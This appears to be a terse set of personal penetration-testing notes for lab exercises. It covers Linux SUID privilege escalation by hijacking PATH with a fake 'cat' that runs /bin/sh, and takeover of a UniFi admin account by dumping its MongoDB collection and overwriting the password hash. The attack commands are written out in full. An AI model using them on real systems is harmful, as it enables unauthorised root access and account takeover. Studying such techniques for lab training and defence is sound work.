https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

Privilege escalation:
Linux
sudo -l <- try to obtain root
id <- check permissions, additional groups
find / -group bugtracker 2>/dev/null
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker

Commonly noted as SUID (Set owner User ID), the special permission for the user access
level has a single function: A file with SUID always executes as the user who owns the
file, regardless of the user passing the command. If the file owner doesn't have
execute permissions, then use an uppercase S here.
In our case, the binary 'bugtracker' is owned by root & we can execute it as root since
it has SUID set.

/tmp

/bin/sh
chmod +x cat
export PATH=/tmp:$PATH
echo "/bin/sh" > cat

//UNIFI MONGODB
ps aux | grep mongo
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`

crete password
mkpasswd -m sha-512 Password1234
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$pgNniKC2xeXtTtRl$KqIpqj6FI8DGb9dXgc7vUCAeGuCWI3rCzKsopTZU5ncfE1F6XjEf.Faq/AecBR7x/ToDPw7bYrVth3kU3WkzS0"}})'






